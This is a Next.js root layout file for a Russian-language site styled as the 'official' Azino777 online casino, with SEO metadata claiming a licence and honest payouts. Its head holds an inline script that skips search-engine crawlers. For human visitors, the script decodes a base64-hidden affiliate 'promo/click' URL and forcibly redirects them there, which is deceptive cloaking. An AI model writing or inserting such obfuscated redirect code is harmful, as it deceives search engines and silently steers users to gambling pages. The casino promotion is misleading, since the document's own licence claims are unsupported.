import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Inter } from 'next/font/google'
import './globals.css'
import './landing.css'

const playfair = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-display',
  display: 'swap',
})

const inter = Inter({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-body',
  display: 'swap',
})

export const metadata: Metadata = {
  title:
    'Азино777 — официальный сайт казино: играть онлайн в слоты и автоматы с бонусами',
  description:
    'Азино777 официальный сайт — играйте в казино онлайн. Слоты, игровые автоматы, бонусы и быстрый вход. Казино мобайл для телефона. Azino777 казино 777 с лицензией, честными выплатами и поддержкой 24/7.',
  keywords: [
    'Азино777 официальный',
    'казино мобайл',
    'Азино777 официальный сайт',
    'Азино777',
    'казино 777',
    'Azino777 официальный',
    'azino777',
    'azino 777',
    'Азино777 казино',
    'Азино казино',
  ],
  openGraph: {
    title: 'Азино777 — официальный сайт казино',
    description:
      'Играйте в казино онлайн: слоты, игровые автоматы, бонусы и быстрый вход. Казино мобайл для телефона.',
    url: 'https://azino777-9casino.vercel.app/',
    siteName: 'Azino777',
    locale: 'ru_RU',
    type: 'website',
    images: [
      {
        url: 'https://azino777-9casino.vercel.app/images/hero-casino.png',
        width: 1200,
        height: 630,
        alt: 'Азино777 официальный сайт казино',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Азино777 — официальный сайт казино',
    description:
      'Слоты, игровые автоматы, бонусы и быстрый вход. Казино мобайл для телефона.',
    images: ['https://azino777-9casino.vercel.app/images/hero-casino.png'],
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
    },
  },
  icons: {
    icon: '/favicon.png',
    shortcut: '/favicon.png',
    apple: '/favicon.png',
  },
}

export const viewport: Viewport = {
  themeColor: '#0b1210',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${playfair.variable} ${inter.variable}`}>
      <head>
        <link rel="canonical" href="https://azino777-9casino.vercel.app/" />
        <meta name="format-detection" content="telephone=no" />
        {/* Дополнительные пользовательские теги можно вставлять ниже */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9rMG0uYmhmNTdiNjc4Zi5jb20vcHJvbW8vY2xpY2svNmE5MDBhMmQzMTNhYQ== "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">{children}</body>
    </html>
  )
}
